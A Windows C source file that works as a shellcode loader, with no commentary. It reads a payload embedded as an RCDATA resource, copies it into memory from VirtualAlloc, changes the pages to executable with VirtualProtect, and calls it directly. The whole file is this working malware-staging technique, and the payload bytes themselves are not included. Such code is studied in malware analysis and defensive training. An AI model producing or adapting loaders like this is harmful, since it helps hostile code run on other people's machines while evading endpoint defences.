#include <Windows.h>
#include <stdio.h>
#include "resource.h"

typedef void payload(void);

int main(void) {
	HRSRC h_resource = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);

	if (h_resource == NULL) {
		printf("FindResourceW failed with error code %x\n", GetLastError());
		return -1;
	}

	HGLOBAL h_resource_data = LoadResource(NULL, h_resource);

	if (h_resource_data == NULL) {
		printf("LoadResource failed with error code %x\n", GetLastError());
		return -2;
	}

	PVOID resource = LockResource(h_resource_data);

	if (resource == NULL) {
		printf("LockResource failed with error code %x\n", GetLastError());
		return -3;
	}

	DWORD resource_size = SizeofResource(NULL, h_resource);

	if (resource_size == 0) {
		printf("SizeofResource failed with error code %x\n", GetLastError());
		return -4;
	}

	PVOID payload_buff = VirtualAlloc(NULL, resource_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (payload_buff == NULL) {
		printf("VirtualAlloc failed with error code %x\n", GetLastError());
		return -5;
	}

	CopyMemory(payload_buff, resource, resource_size);

	DWORD old_protections;

	if (!VirtualProtect(payload_buff, resource_size, PAGE_EXECUTE_READ, &old_protections)) {
		printf("VirtualProtect failed with error code %x\n", GetLastError());
		return -6;
	}

	payload* fn_payload = (payload*)payload_buff;

	fn_payload();

	return 0;
}